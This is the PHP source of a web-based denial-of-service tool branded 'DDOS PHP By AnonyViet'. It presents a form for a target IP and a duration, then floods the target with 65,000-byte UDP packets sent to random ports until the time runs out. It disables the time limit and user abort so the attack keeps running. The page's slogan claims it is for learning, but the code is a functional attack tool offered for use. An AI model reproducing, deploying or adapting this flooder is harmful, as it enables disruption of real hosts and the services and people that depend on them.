<?php 
$ip = $_SERVER['REMOTE_ADDR']; 
?> 

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<html>  
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>DDOS PHP By AnonyViet</title> 
<center>  
<body background="http://up.ssc.vn/images/329logoddoslam.png"> 
<font color="FF3636">  
<font size= "6"> 
<font size="5"> 
<pre>  

</pre>  
<b>Your IP:</b> <font color="blue"><?php echo $ip; ?></font>&nbsp;(Độ mạnh trung 
bình)<br><br><font color="blue"> 
</font> 
<STYLE>  
input{  
background-color: white; font-size: 10pt; color: black; font-family: Tahoma; border: 1 solid #66; 
}  
button{  
background-color:# FF0303; font-size: 8pt; color: black; font-family: Tahoma; border: 1 solid #66;  
}  
body {  

}  
</style>  
<?php  
//UDP  
if(isset($_GET['host'])&&isset($_GET['time'])){  
    $packets = 0;  
    ignore_user_abort(TRUE);  
    set_time_limit(0);  

    $exec_time = $_GET['time'];  

    $time = time();  
    //print "Started: ".time('d-m-y h:i:s')."<br>";  
    $max_time = $time+$exec_time;  

    $host = $_GET['host'];  

    for($i=0;$i<65000;$i++){  
    $out .= 'X';  
    }  
    while(1){  
    $packets++;  
    if(time() > $max_time){  
    break;  
    }  
    $rand = rand(1,65000);  
    $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);  
    if($fp){  
    fwrite($fp, $out);  
    fclose($fp);  
    }  
    }  
    echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";  
    echo '<br><br>  
  <form action="'.$surl.'" method=GET>  
  <input type="hidden" name="act" value="phptools">  
  IP cần tấn công: <br><input type=text name=host><br>  
  Thời gian (giây): <br><input type=text name=time><br>  
  <input type=submit value=Go></form>';  
}else{ echo '<br><b>UDP Flood</b><br>  
    <form action=? method=GET>  
    <input type="hidden" name="act" value="phptools">  
    Host: <br><input type=text name=host value=><br>  
    Length (seconds): <br><input type=text name=time value=><br><br>  
    <input type=submit value=Go></form>';  
}  
?>  
<marquee behavior="scroll" direction="right"><font color="limegreen"><center><strong>We are AnonyViet</strong></font></marquee> 
<marquee behavior="scroll" direction="left"><font color="blue"><center><strong>We are not Hacker, Only Hack to Learn, No Learn to Hack</strong></font></marquee</center>  
</head>
</body>  
</html>